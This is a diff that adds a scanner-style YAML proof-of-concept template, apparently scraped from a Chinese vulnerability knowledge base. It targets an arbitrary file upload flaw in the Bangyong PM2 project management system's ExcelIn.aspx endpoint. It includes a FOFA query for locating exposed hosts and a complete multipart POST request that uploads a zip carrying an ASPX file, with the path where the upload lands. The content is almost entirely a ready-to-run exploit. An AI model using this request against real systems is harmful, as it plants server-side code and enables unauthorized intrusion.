@@ -1,0 +1,87 @@
+id: poc-kgu2nraqvdfdbhoe
+info:
+  name: 邦永PM2项目管理系统ExcelIn.aspx存在任意文件上传
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/kgu2nraqvdfdbhoe'
+  tags: file-upload,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: kgu2nraqvdfdbhoe
+    fofa: body="PM2项目管理系统BS版增强工具.zip"
+http:
+- raw:
+  - '[http://ip/FlowChartDefine/ExcelIn.aspx](http://ip/FlowChartDefine/ExcelIn.aspx)
+
+    上传压缩包
+
+
+    ![](https://cdn.nlark.com/yuque/0/2024/png/43110909/1723974544136-4ec83b45-f1f7-4978-bc54-a36b32c2e3a1.png)
+
+    POST /FlowChartDefine/ExcelIn.aspx HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Accept-Encoding: gzip, deflate
+
+    Content-Type: multipart/form-data; boundary=---------------------------335518608136410266804188096265
+
+    Origin:
+
+    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+
+    Upgrade-Insecure-Requests: 1
+
+    Accept-Ldwk: bG91ZG9uZ3dlbmt1
+
+    Priority: u=0, i
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0
+
+    Cookie: ASP.NET_SessionId=hovcho2iwrxygzgkt0l2oomc
+
+    -----------------------------335518608136410266804188096265
+
+    Content-Disposition: form-data; name="__VIEWSTATE"
+
+    CX8CDdAjNN9+19sa3xOCEybpUx0hn5DnMqGQQzm1JI+njfE/pGi9oDDI5PRCH8wVs/UCahOCnHho2chhS8X5jCYrh1hzlOaS5VIl/VYxh3LhmXkQwsOYhNFmg9+ZmmilXRKT5WAN6WceP6U9c1Kqtw==
+
+    -----------------------------335518608136410266804188096265
+
+    Content-Disposition: form-data; name="__VIEWSTATEGENERATOR"
+
+    FD259C0F
+
+    -----------------------------335518608136410266804188096265
+
+    Content-Disposition: form-data; name="__EVENTVALIDATION"
+
+    dvfybORq87SoxN9g6GB9Qryd4qSb5ynAZtDiE0yV2TwdNpGBHpvAVQSmjJzCuqbm/b0rSjXag7dSZXfX041XcbqxqzunkN0F88hB7kUvvb8RZ0DDlXcuuntLzH6gkJYF
+
+    -----------------------------335518608136410266804188096265
+
+    Content-Disposition: form-data; name="FileUpload1"; filename="1.zip"
+
+    Content-Type: application/x-zip-compressed
+
+    {{unquote("PK\x03\x04\x14\x00\x00\x00\x08\x009\x8d\x05Ym\xad\x18]b\x00\x00\x00c\x00\x00\x00\x06\x00\x00\x001.aspx\xb3Qu\x08HLOU\xf0I\xccK/\x052l\x95\x9c\x95\x95T\xedlT\x83R\x8b\x0b\xf2\xf3\x8aS\xf5\xc2\x8b2KR5\x942Rsr\xf2u\x02|\x8d\x944\xad\x83+\x8bKRs\xf5<\xfd\xf5\xdc2sR\xf5\\RsR\x81J\x82R\x0bKS\x8bK\xf4\x022*\x8b3\x93\x13s\x02\x12K24\xadU\xed\x00PK\x01\x02\x1f\x00\x14\x00\x00\x00\x08\x009\x8d\x05Ym\xad\x18]b\x00\x00\x00c\x00\x00\x00\x06\x00$\x00\x00\x00\x00\x00\x00\x00 \x00\x00\x00\x00\x00\x00\x001.aspx\x0a\x00 \x00\x00\x00\x00\x00\x01\x00\x18\x00\x91\xc7Z\xb2\x1b\xe7\xda\x01\xd2\x8e\xf5\xb2\x1b\xe7\xda\x01;\xe3\xa6\x99\x1b\xe7\xda\x01PK\x05\x06\x00\x00\x00\x00\x01\x00\x01\x00X\x00\x00\x00\x86\x00\x00\x00\x00\x00")}}
+
+    -----------------------------335518608136410266804188096265
+
+    Content-Disposition: form-data; name="Button1"
+
+    模块导入
+
+    -----------------------------335518608136410266804188096265--
+
+
+    上传定位：
+
+    http://ip/FlowChartDefine/压缩包里的文件名'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
